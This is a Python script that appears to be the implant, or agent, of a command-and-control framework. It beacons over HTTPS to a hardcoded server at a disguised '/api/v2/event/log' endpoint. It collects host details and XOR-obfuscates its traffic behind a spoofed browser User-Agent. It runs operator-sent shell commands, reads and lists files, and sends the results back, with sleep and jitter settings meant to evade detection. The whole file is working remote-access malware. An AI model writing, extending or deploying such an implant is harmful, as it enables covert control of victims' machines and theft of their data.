#!/usr/bin/env python3
import base64
import getpass
import json
import os
import random
import socket
import subprocess
import sys
import uuid
from datetime import datetime
from time import sleep

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#Xor encrypt/decrypt
def encryptDecrypt(input):
        key = ['f', 'C', 'q', 'Z', 'z', '2', '6', '!', 'z', '@', 'P', 'p', 'p', 'Z', '9'] #Can be any chars, and any size array
        output = []
        for i in range(len(input)):
                xor_num = ord(input[i]) ^ ord(key[i % len(key)])
                output.append(chr(xor_num))
        return ''.join(output)

#URL is provided by 3 arguments, IP - PORT - 1 for https or 0 for http. This should be initiated by the stager.
#Can also hardcode it in into script
#host = "ec450b1fcbd2f6cecefcfc4cae52284b"
#port = "2eb9c9299ecd7a1d6e9e2f724aa7cf66"
#https = "1a94d25ca9c5ff229b3f609d8f976b0b"
host = "192.168.1.56"
port = "443"
https = "1"

if https == "1":
	ssl = "https"
else:
	ssl = "http"
url = '%s://%s:%s/api/v2/event/log' % (ssl,host,port)
uuid = ''.join(str(uuid.uuid4()).split('-')[0:])

try:
    from subprocess import DEVNULL
except ImportError:
    DEVNULL = os.open(os.devnull, os.O_RDWR)

def run(command):
	try:
		output = subprocess.check_output(command, shell=True, stdin=DEVNULL, stderr=DEVNULL)
	except:
		output = "%s: Command not found" % command
	return output

sleep_time = 5
jitter = 0

hostname = socket.gethostname()
interfaces = run('ip a')
ip = str(interfaces).split('inet')[2].split(' ')[1].split('/')[0]
x = 1
while ip == "127.0.0.1" or ":" in ip:
        x+=1
        ip = str(interfaces).split('inet')[x].split(' ')[1].split('/')[0]

user = getpass.getuser()
#platform = sys.platform
if ("linux" in sys.platform):
	platform = "linux"
else:
	platform = sys.platoform

is_admin = os.getuid() == 0
is_admin = str(is_admin)

pid = os.getpid()

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'}

procname = sys.argv[0]

while True:
	try:
		host = {"host": {"type":"http","hostname":hostname,"ip":ip,"user":user,"procname":procname,"platform":platform,"admin":is_admin,"uuid":uuid,"time":str(datetime.utcnow()).split(".")[0],"sleep":str(sleep_time),"jitter":str(jitter),"entropy":" " * random.randint(0, 64),"pid":str(pid),"trueSleep":str(sleep_time+jitter)}}
		response = requests.post(url, json={"request":base64.b64encode(encryptDecrypt(json.dumps(host)).encode('utf-8')).decode('utf-8')}, verify=False, headers=headers)

		try:
			data = json.loads(encryptDecrypt(base64.b64decode(json.loads(response.content)["response"]).decode('utf-8')))
		except:
			data = None

		if data is not None:
			all_results = []

			if '42a805da0b27007d4f02d0ecab9b5ce3' in data: #exec
				for item in data['42a805da0b27007d4f02d0ecab9b5ce3']:
					results = run(item.lower())
							
					try:
						all_results.append(results.decode('utf-8'))
					except:
						all_results.append(results)

			if 'e8e0822326d9e3d3a7d2818769470cbc' in data: #cat
				for item in data['e8e0822326d9e3d3a7d2818769470cbc']:
					results = run("cat %s" % item)
					all_results.append("Reading File:%s\n%s" % (item,results.decode('utf-8')))

			if '940a987b3fe113ede40266f583741df9' in data: #cd
				os.chdir(data['940a987b3fe113ede40266f583741df9'])
				all_results.append("Moved directories %s" % data['940a987b3fe113ede40266f583741df9'])
			
			if '05095c55757d514f7123a3e08175ca3a' in data: #ps
				results = run("ps")
				all_results.append(results.decode('utf-8'))

			if 'a268ee76cc22048f86a5a905b32814bb' in data: #pwd
				results = run("pwd")
				all_results.append(results.decode('utf-8'))
			
			if 'a5ced20888db593ae38dafe5182f3cc5' in data: #ls
				results = []
				for item in data['a5ced20888db593ae38dafe5182f3cc5']:
					path = '.'
					if item != '.':
						path = item
					results = run("ls %s" % path)
					all_results.append('Enumerating %s\n' % path  + results.decode('utf-8'))

			if '8bc92ae80d75eff6caedde5b9010a1f8' in data: #sleep
				sleep_time = data['8bc92ae80d75eff6caedde5b9010a1f8'].split(' ')
				if len(sleep_time) > 1:
					jitter = int(sleep_time[1])
				sleep_time = int(sleep_time[0])
				all_results.append("Now reaching out every %s seconds with a %s%% jitter." % (sleep_time,jitter))

			if '4cc6791e40eaacf7aa591b48a397ae7c' in data: #exit
				all_results.append("Exiting.")
				return_data = {"results":all_results}
				return_data = dict(host, **return_data)
				return_data = {"request":base64.b64encode(encryptDecrypt(json.dumps(return_data)).encode('utf-8')).decode('utf-8')}
				response = requests.post(url, json=return_data, verify=False, headers=headers)
				sys.exit(int(data['4cc6791e40eaacf7aa591b48a397ae7c']))
			else:
				return_data = {"results":all_results}
				return_data = dict(host, **return_data)
				return_data = {"request":base64.b64encode(encryptDecrypt(json.dumps(return_data)).encode('utf-8')).decode('utf-8')}
				response = requests.post(url, json=return_data, verify=False, headers=headers)

		jitter_amount = sleep_time*(jitter/100)
		sleep_final = sleep_time + (random.randint(-jitter_amount,jitter_amount))
		sleep(sleep_final)
	except Exception as e:
		#print(e)
		sleep(sleep_time)
		continue
